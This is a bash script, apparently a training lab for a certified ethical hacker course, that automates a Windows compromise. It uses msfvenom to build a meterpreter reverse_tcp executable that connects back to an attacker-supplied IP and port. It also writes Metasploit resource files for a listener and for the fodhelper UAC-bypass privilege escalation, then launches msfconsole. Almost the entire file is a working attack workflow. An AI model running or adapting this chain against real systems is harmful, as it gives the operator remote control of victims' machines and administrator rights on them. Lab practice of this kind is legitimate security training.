#!/bin/bash

# ==============================================================================
# CEH Lab 2: UAC Bypass & Privilege Escalation (Process-Corrected Version)
# ==============================================================================

# 1. Preflight Checks
if [[ "$EUID" -ne 0 ]]; then 
    echo "[ERROR] Please run as root (sudo su)" >&2
    exit 1
fi

REQUIRED_CMDS=("msfvenom" "msfconsole" "python3" "realpath")
for cmd in "${REQUIRED_CMDS[@]}"; do
    if ! command -v "$cmd" &> /dev/null; then
        echo "[ERROR] Required command '$cmd' is not installed. Aborting." >&2
        exit 1
    fi
done

echo "--- Lab 2 Configuration ---"

# 2. Robust IP Validation (Python)
while true; do
    read -p "Enter Attacker IP (LHOST): " LHOST
    if python3 - "$LHOST" <<'PY'
import ipaddress, sys
try:
    ipaddress.IPv4Address(sys.argv[1])
    sys.exit(0)
except ValueError:
    sys.exit(1)
PY
    then
        break
    else
        echo "[!] Invalid IPv4 address. Please try again."
    fi
done

# Port Validation
while true; do
    read -p "Enter Attacker Port (LPORT): " LPORT
    if [[ $LPORT =~ ^[0-9]+$ ]] && [ "$LPORT" -ge 1 ] && [ "$LPORT" -le 65535 ]; then
        break
    else
        echo "[!] Invalid port. Enter 1-65535."
    fi
done

# Paths
EXE_PATH="/home/attacker/Desktop/Windows.exe"
HANDLER_RC="handler.rc"
ESCALATE_RC="escalate.rc"

# 3. Directory & Payload Generation
mkdir -p /home/attacker/Desktop || { echo "[ERROR] Directory creation failed"; exit 1; }
[[ -w /home/attacker/Desktop ]] || { echo "[ERROR] Directory not writable"; exit 1; }

echo -e "\n[*] Generating Windows Payload..."
rm -f "$EXE_PATH"
if msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > "$EXE_PATH"; then
    if [ -s "$EXE_PATH" ]; then
        echo "[+] SUCCESS: Payload located at $(realpath "$EXE_PATH")"
    else
        echo "[ERROR] Payload file is empty." >&2; exit 1
    fi
else
    echo "[ERROR] msfvenom failed." >&2; exit 1
fi

# 4. Resource File Generation (Correcting Variable Expansion)
echo "[*] Creating Metasploit resource files..."

# Handler RC: Starts the listener
cat <<EOF > "$HANDLER_RC"
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
run -j
EOF

# Escalation RC: This will be loaded INSIDE the running console
# We use a placeholder for the session ID that the user will check
cat <<EOF > "$ESCALATE_RC"
# Note: Ensure you have verified your session ID with 'sessions -l'
# Change the session number below if it is not 1
set SESSION_ID 1
use exploit/windows/local/bypassuac_fodhelper
set session \$SESSION_ID
set LHOST $LHOST
set TARGET 0
exploit
EOF

[[ -s "$HANDLER_RC" ]] && [[ -s "$ESCALATE_RC" ]] || { echo "[ERROR] RC files not created"; exit 1; }

echo -e "\n===================================================================="
echo "STAGE 1: ESTABLISHING CONNECTION"
echo "1. Transfer and run: $EXE_PATH"
echo "2. Metasploit is now launching in the foreground."
echo "[!] IMPORTANT: DO NOT EXIT METASPLOIT ONCE THE SESSION OPENS."
echo "===================================================================="

# Launch Metasploit once. The script pauses here.
msfconsole -r "$HANDLER_RC"

# Once the user eventually exits msfconsole, the script finishes.
echo -e "\n[INFO] Metasploit session closed. Lab complete."
